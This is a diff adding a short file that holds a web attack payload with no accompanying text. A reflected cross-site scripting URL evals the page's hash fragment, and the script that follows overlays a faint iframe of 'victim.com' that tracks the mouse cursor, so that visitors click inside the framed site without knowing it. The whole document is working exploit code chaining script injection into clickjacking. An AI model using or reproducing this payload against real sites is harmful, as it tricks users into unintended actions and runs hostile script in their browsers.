@@ -1,0 +1,29 @@
+http://example.com/?search=
+<script>eval(location.hash.slice(1))</script>#
+a = document.body.appendChild(document.createElement("iframe"));
+a.d = a.contentDocument;
+a.d.open().close();
+i = a.d.createElement("iframe");
+a.style.width = 90;
+a.style.height = 90;
+a.style.border = i.style.border = 0;
+a.style.position = i.style.position = "absolute";
+a.style.overflow = i.style.overflow = "hidden";
+a.style.opacity = .3;
+i.style.width = 100;
+i.style.height = 100;
+i.style.left = -10;
+i.style.top = -10;
+i.src="http://www.victim.com/";
+
+a.d.body.appendChild(i);
+
+function followmouse(e) {
+xcoord = ycoord = 40;
+xcoord += e.pageX - 50;
+ycoord += e.pageY - 50;
+a.style.left = xcoord;
+a.style.top = ycoord;
+}
+
+document.onmousemove=followmouse;
